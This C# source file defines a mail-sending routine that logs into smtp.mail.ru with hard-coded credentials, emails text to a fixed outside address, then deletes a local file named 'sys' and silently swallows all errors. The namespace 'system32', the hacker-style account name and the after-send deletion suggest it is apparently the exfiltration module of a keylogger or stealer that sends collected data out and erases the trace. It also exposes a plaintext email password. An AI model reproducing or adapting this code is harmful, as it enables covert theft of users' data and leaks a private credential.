using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail; 
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.IO;


namespace system32
{
    class mail
    {
        public static void SendMail(string tema="Письмо от C Sharp",string body_c="Привет! \n\n\n Это тестовое письмо от C Sharp")
        {
            //smtp сервер
            string smtpHost = "smtp.mail.ru";
            //smtp порт
            int smtpPort = 25;
            //логин
            string login = "xak3ra";
            //пароль
            string pass = "fk#$342Hljj";

            //создаем подключение
            SmtpClient client = new SmtpClient(smtpHost, smtpPort);
            client.Credentials = new NetworkCredential(login, pass);

            //От кого письмо
            string from = "xak3ra@mail.ru";
            //Кому письмо
            string to = "imperituro@mail.ru";
            //Тема письма
            string subject = tema; 
            //Текст письма
            string body = body_c;

            //Создаем сообщение
            MailMessage mess = new MailMessage(from, to, subject, body);

            try
            {

               // mess.SubjectEncoding = Encoding.Default;
              //  mess.BodyEncoding = Encoding.Default;
              //  mess.Headers["Content-type"] = "text/plain; charset=windows-1251";
                client.Send(mess);
                if (File.Exists(@"c:\\Мои документы\ey\sys"))
                {
                    File.Delete(@"c:\\Мои документы\ey\sys");
                }
            }
            catch (Exception e)
            {
                
            }
            finally
            {
                client.Dispose();
            }
        }
    }
}
